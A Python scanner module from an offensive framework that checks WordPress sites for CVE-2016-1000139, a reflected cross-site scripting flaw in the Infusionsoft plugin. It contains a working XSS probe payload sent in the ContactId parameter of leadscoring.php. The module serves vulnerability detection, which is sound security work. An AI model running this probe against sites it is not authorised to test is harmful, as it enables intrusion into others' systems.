#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""WordPress plugin Infusionsoft 1."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'WordPress Infusionsoft Gravity Forms <=1.5.11 - Cross-Site Scripting Detection',
        'description': 'WordPress plugin Infusionsoft 1.5.11 and before contains a reflected cross-site scripting vulnerability which allows an attacker to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve2016', 'cve', 'wordpress', 'wp-plugin', 'xss', 'wpscan', 'infusionsoft_project', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://wpscan.com/vulnerability/0a60039b-a08a-4f51-a540-59f397dceb6a',
            'https://wordpress.org/plugins/infusionsoft',
            'http://www.vapidlabs.com/wp/wp_advisory.php?v=864',
            'https://nvd.nist.gov/vuln/detail/CVE-2016-1000139',
            'https://github.com/ARPSyndicate/cvemon',
        ],
        'cve': 'CVE-2016-1000139',
    }

    def run(self):
        path = '/wp-content/plugins/infusionsoft/readme.txt'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = (r.text or "").lower()
        body_all = ('infusionsoft', 'tags:',)
        if not (all(m in body for m in body_all)):
            return False
        path = '/wp-content/plugins/infusionsoft/Infusionsoft/examples/leadscoring.php?ContactId=%22%3E%3Cscript%3Ealert%28document.domain%29%3B%3C%2Fscript%3E%3C%22'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_all = ('"><script>alert(document.domain);</script><"', 'input type="text" name="ContactId"',)
        header_any = ('text/html',)
        if (all(m in body for m in body_all)) and (any(m in headers for m in header_any)):
            self.set_info(severity='medium', reason='WordPress Infusionsoft Gravity Forms <=1.5.11 - Cross-Site Scripting detected', path=path)
            return True
        return False

